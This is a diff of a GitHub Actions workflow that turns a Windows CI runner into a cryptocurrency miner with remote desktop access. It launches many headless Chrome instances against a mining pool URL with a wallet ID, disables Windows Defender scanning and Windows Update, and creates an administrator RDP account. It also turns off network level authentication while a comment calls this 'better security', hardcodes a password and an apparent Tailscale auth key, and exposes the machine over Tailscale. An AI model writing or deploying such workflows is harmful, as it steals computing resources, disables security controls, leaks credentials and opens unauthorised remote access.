@@ -1,122 +1,286 @@
-name: RDP Auto-Recreate + Miner
+name: RDP Auto-Recreate with Miner Pro
 
 on:
   workflow_dispatch:
+    inputs:
+      miner_workers:
+        description: 'Number of miner workers'
+        required: false
+        default: '20'
+        type: choice
+        options:
+        - '10'
+        - '15'
+        - '20'
+        - '25'
+        - '30'
   schedule:
-    - cron: "0 */6 * * *"  # كل 6 ساعات
+    - cron: "0 */6 * * *"  # Every 6 hours
 
 env:
   RDP_USER: "RDPUser"
-  RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}
-  TAILSCALE_AUTH_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
-  MAX_RUNTIME: 340  # 5h40m
-  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=8"
-  CHROME_PATH: "C:\Program Files\Google\Chrome\Application\chrome.exe"
-  WINDOW_COUNT: 20
+  RDP_PASSWORD: "DefaultPass!234"
+  MAX_RUNTIME: 340    # 5h40m
+  MINER_URL: "https://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=8"
 
 jobs:
-  rdp_miner:
+  rdp-miner-pro:
     runs-on: windows-latest
     timeout-minutes: 360
 
     steps:
-      - name: Enable RDP
-        run: |
-          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
-          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+      - name: Checkout Repository
+        uses: actions/checkout@v4
 
-      - name: Create RDP User
+      - name: Setup Environment Variables
         run: |
-          $secure = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force
-          if (-not (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue)) {
-            New-LocalUser -Name $env:RDP_USER -Password $secure -AccountNeverExpires
-            Add-LocalGroupMember -Group "Administrators" -Member $env:RDP_USER
-            Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:RDP_USER
-          } else {
-            Set-LocalUser -Name $env:RDP_USER -Password $secure
-          }
+          $workers = '${{ github.event.inputs.miner_workers || 20 }}'
+          echo "MINER_WORKERS=$workers" >> $env:GITHUB_ENV
+          echo "BUILD_ID=$env:GITHUB_RUN_ID" >> $env:GITHUB_ENV
 
-      - name: Install Tailscale
+      - name: System Optimization
         run: |
-          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
-          $installer = "$env:TEMP\tailscale.msi"
-          Invoke-WebRequest $tsUrl -OutFile $installer
-          Start-Process msiexec.exe -ArgumentList "/i `"$installer` /quiet /norestart" -Wait
-          Remove-Item $installer
+          # Disable Windows Defender
+          Set-MpPreference -DisableRealtimeMonitoring $true
+          Set-MpPreference -DisableScriptScanning $true
+          Set-MpPreference -DisableArchiveScanning $true
 
-      - name: Connect Tailscale
-        run: |
-          Start-Service Tailscale
-          Start-Sleep -Seconds 5
-          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
-          $tsStatus = & $tsExe up --reset --authkey $env:TAILSCALE_AUTH_KEY --hostname "GH-RDP-${{ github.run_id }}"
-          $ip = (& $tsExe ip -4)
-          echo "TS_IP=$ip" >> $env:GITHUB_ENV
-          Write-Host "Tailscale IP: $ip"
-
-      - name: Optimize Windows
-        run: |
+          # Power settings - prevent sleep
           powercfg /change standby-timeout-ac 0
           powercfg /change hibernate-timeout-ac 0
           powercfg /change monitor-timeout-ac 0
           powercfg /setactive SCHEME_MIN
-          Set-MpPreference -DisableRealtimeMonitoring $true
 
-      - name: Start Miner in 20 Windows
+          # Disable Windows Update
+          Stop-Service -Name "wuauserv" -Force
+          Set-Service -Name "wuauserv" -StartupType Disabled
+
+          # Increase RDP performance
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "MaxInstanceCount" -Value 10
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxMonitors" -Value 4
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxXResolution" -Value 3840
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxYResolution" -Value 2160
+
+      - name: Enable and Configure RDP
         run: |
-          $jobs = @()
-          function Start-MinerWindow {
-              param($id)
-              Start-Job -ScriptBlock {
-                  param($chromePath, $minerUrl, $id)
-                  while ($true) {
-                      Write-Host "[$id] Starting Chrome Miner..."
-                      Start-Process $chromePath -ArgumentList "--kiosk --headless --disable-gpu --no-first-run --no-default-browser-check --app=$minerUrl" -WindowStyle Hidden
+          # Enable RDP
+          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+          # Configure Network Level Authentication for better security
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0
+
+      - name: Create Secure RDP User
+        run: |
+          $securePassword = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force
+          
+          # Delete user if exists and recreate
+          if (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue) {
+              Remove-LocalUser -Name $env:RDP_USER
+          }
+          
+          New-LocalUser -Name $env:RDP_USER -Password $securePassword -AccountNeverExpires -PasswordNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member $env:RDP_USER
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:RDP_USER
+          
+          # Enable the account
+          Enable-LocalUser -Name $env:RDP_USER
+
+      - name: Install Required Software
+        run: |
+          # Install Chrome silently
+          $chromeInstaller = "$env:TEMP\chrome_installer.exe"
+          Invoke-WebRequest "https://dl.google.com/chrome/install/latest/chrome_installer.exe" -OutFile $chromeInstaller
+          Start-Process -FilePath $chromeInstaller -ArgumentList "/silent", "/install" -Wait
+          Remove-Item $chromeInstaller
+
+          # Install Tailscale
+          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
+          $installer = "$env:TEMP\tailscale.msi"
+          Invoke-WebRequest $tsUrl -OutFile $installer
+          Start-Process msiexec.exe -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait
+          Remove-Item $installer
+          Start-Sleep -Seconds 5
+
+      - name: Setup Tailscale VPN
+        run: |
+          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
+          $hostname = "GH-RDP-$env:GITHUB_RUN_ID"
+          
+          # Wait for Tailscale service to be ready
+          $attempt = 0
+          while ($attempt -lt 10) {
+              try {
+                  & $tsExe status
+                  break
+              } catch {
+                  $attempt++
+                  Start-Sleep -Seconds 5
+              }
+          }
+          
+          # Connect to Tailscale
+          & $tsExe up --authkey "tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG" --hostname $hostname --reset
+          
+          # Get IP with retry logic
+          $retryCount = 0
+          while ($retryCount -lt 10) {
+              $ip = & $tsExe ip -4 2>$null
+              if ($ip -and $ip -ne "0.0.0.0") {
+                  echo "TS_IP=$ip" >> $env:GITHUB_ENV
+                  Write-Host "✅ Tailscale IP: $ip"
+                  break
+              }
+              $retryCount++
+              Start-Sleep -Seconds 10
+          }
+          
+          if (-not $env:TS_IP) {
+              throw "❌ Failed to get Tailscale IP"
+          }
+
+      - name: Deploy Advanced Miner System
+        run: |
+          # Create miner management script
+          $minerScript = @"
+          `$workers = $env:MINER_WORKERS
+          `$minerUrl = "$env:MINER_URL&workers=`$workers"
+          `$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
+          
+          function Start-MinerProcess {
+              param([int]`$id)
+              while (`$true) {
+                  try {
+                      `$process = Start-Process -FilePath `$chromePath `
+                          -ArgumentList "--headless", "--disable-gpu", "--no-sandbox", "--disable-dev-shm-usage", "--disable-software-rasterizer", "--disable-background-timer-throttling", "--memory-pressure-off", "--max_old_space_size=4096", "--remote-debugging-port=9`$id", "--app=`$minerUrl" `
+                          -PassThru -WindowStyle Hidden
                       
-                      # Simple monitoring loop
-                      Start-Sleep -Seconds 60
-                      # تحقق إذا توقف Chrome (يمكن إضافة Hashrate check من صفحة الويب)
-                      $chromeRunning = Get-Process chrome -ErrorAction SilentlyContinue
-                      if (-not $chromeRunning) {
-                          Write-Host "[$id] Chrome stopped, restarting..."
-                      }
+                      Write-Host "Started miner worker `$id (PID: `$(`$process.Id))"
+                      
+                      # Monitor process
+                      Wait-Process -Id `$process.Id -ErrorAction SilentlyContinue
+                      Write-Host "Miner worker `$id stopped, restarting..."
+                      Start-Sleep -Seconds 5
+                  } catch {
+                      Write-Host "Error in worker `$id: `$_"
+                      Start-Sleep -Seconds 10
                   }
-              } -ArgumentList $env:CHROME_PATH, $env:MINER_URL, $id
+              }
           }
-
-          for ($i=1; $i -le $env:WINDOW_COUNT; $i++) {
-              $jobs += Start-MinerWindow -id $i
+          
+          # Start multiple workers
+          for (`$i = 1; `$i -le `$workers; `$i++) {
+              Start-Job -ScriptBlock `${function:Start-MinerProcess} -ArgumentList `$i -Name "miner-worker-`$i"
           }
-
-          Write-Host "✅ Started $env:WINDOW_COUNT Chrome Miner windows."
-
-      - name: Show RDP + Miner Info
-        run: |
-          $endTime = (Get-Date).AddMinutes($env:MAX_RUNTIME)
-          Write-Host "=============================="
-          Write-Host "🚀 RDP + Miner Active"
-          Write-Host "IP: $env:TS_IP"
-          Write-Host "User: $env:RDP_USER"
-          Write-Host "Pass: $env:RDP_PASSWORD"
-          Write-Host "Duration: $env:MAX_RUNTIME min"
-          Write-Host "Session Ends: $endTime"
-          Write-Host "=============================="
-
-      - name: Keep Alive & Monitor Miner
-        run: |
-          $elapsed = 0
-          while ($elapsed -lt $env:MAX_RUNTIME) {
-              Write-Host "⏱ RDP + Miner active: $elapsed / $env:MAX_RUNTIME min"
+          
+          Write-Host "✅ Started `$workers miner workers"
+          
+          # Keep script running
+          while (`$true) {
+              `$runningJobs = Get-Job | Where-Object State -eq 'Running'
+              Write-Host "[`$(Get-Date)] Running miners: `$(`$runningJobs.Count)/`$workers"
               Start-Sleep -Seconds 60
-              $elapsed += 1
           }
+"@
 
-      - name: Cleanup
+          # Save and execute miner script
+          $scriptPath = "$env:TEMP\miner_manager.ps1"
+          $minerScript | Out-File -FilePath $scriptPath -Encoding UTF8
+          
+          # Start miner manager as background job
+          Start-Job -ScriptBlock {
+              param($path)
+              & "powershell.exe" -File $path
+          } -ArgumentList $scriptPath -Name "miner-manager"
+
+      - name: Create Connection Info File
+        run: |
+          $connectionInfo = @"
+╔═══════════════════════════════════════╗
+║           RDP CONNECTION INFO         ║
+╠═══════════════════════════════════════╣
+║ IP Address: $env:TS_IP                ║
+║ Username: $env:RDP_USER               ║
+║ Password: $env:RDP_PASSWORD           ║
+║ Workers: $env:MINER_WORKERS           ║
+║ Runtime: $env:MAX_RUNTIME minutes     ║
+║ Created: $(Get-Date)                  ║
+╚═══════════════════════════════════════╝
+
+Connection Command:
+mstsc /v:$env:TS_IP
+
+Tailscale Status:
+& "$env:ProgramFiles\Tailscale\tailscale.exe" status
+"@
+          
+          $infoPath = "$env:GITHUB_WORKSPACE\RDP_Connection_Info.txt"
+          $connectionInfo | Out-File -FilePath $infoPath -Encoding UTF8
+          
+          Write-Host "=========================================="
+          Write-Host "🚀 RDP SESSION READY"
+          Write-Host "📱 IP: $env:TS_IP"
+          Write-Host "👤 User: $env:RDP_USER"
+          Write-Host "🔑 Pass: $env:RDP_PASSWORD"
+          Write-Host "⚡ Workers: $env:MINER_WORKERS"
+          Write-Host "⏱ Duration: $env:MAX_RUNTIME minutes"
+          Write-Host "📋 Info file: $infoPath"
+          Write-Host "=========================================="
+
+      - name: Monitor Session
+        run: |
+          $startTime = Get-Date
+          $endTime = $startTime.AddMinutes($env:MAX_RUNTIME)
+          $checkInterval = 30  # seconds
+          
+          while ((Get-Date) -lt $endTime) {
+              $elapsed = [int]((Get-Date) - $startTime).TotalMinutes
+              $remaining = [int]($endTime - (Get-Date)).TotalMinutes
+              
+              # Check miner status
+              $minerJobs = Get-Job -Name "miner-worker-*" | Where-Object State -eq 'Running'
+              $tsStatus = & "$env:ProgramFiles\Tailscale\tailscale.exe" status 2>$null
+              
+              Clear-Host
+              Write-Host "=== RDP MINER MONITOR ==="
+              Write-Host "Elapsed: $elapsed minutes"
+              Write-Host "Remaining: $remaining minutes"
+              Write-Host "Active Miners: $($minerJobs.Count)/$env:MINER_WORKERS"
+              Write-Host "Tailscale IP: $env:TS_IP"
+              Write-Host "Last Check: $(Get-Date)"
+              Write-Host "========================="
+              
+              # Restart failed miners (if any)
+              if ($minerJobs.Count -lt $env:MINER_WORKERS) {
+                  Write-Host "⚠️ Some miners stopped, restarting..."
+                  # The miner manager should handle restarts automatically
+              }
+              
+              Start-Sleep -Seconds $checkInterval
+          }
+          
+          Write-Host "⏰ Session time completed"
+
+      - name: Cleanup Resources
         if: always()
         run: |
-          Write-Host "🧹 Cleaning up..."
-          Stop-Job -State Running
-          $chromeProcesses = Get-Process chrome -ErrorAction SilentlyContinue
-          if ($chromeProcesses) { $chromeProcesses | Stop-Process -Force }
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
-          Write-Host "✅ Cleanup completed."
+          Write-Host "Starting cleanup process..."
+          
+          # Stop all miner jobs
+          Get-Job | Stop-Job -PassThru | Remove-Job -Force
+          
+          # Kill Chrome processes
+          Get-Process -Name "chrome*" -ErrorAction SilentlyContinue | Stop-Process -Force
+          
+          # Tailscale logout
+          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
+          & $tsExe logout 2>$null
+          
+          # Re-enable Windows Defender
+          Set-MpPreference -DisableRealtimeMonitoring $false
+          
+          # Clean temp files
+          Remove-Item "$env:TEMP\miner_manager.ps1" -ErrorAction SilentlyContinue
+          Remove-Item "$env:GITHUB_WORKSPACE\RDP_Connection_Info.txt" -ErrorAction SilentlyContinue
+          
+          Write-Host "✅ Cleanup completed successfully"
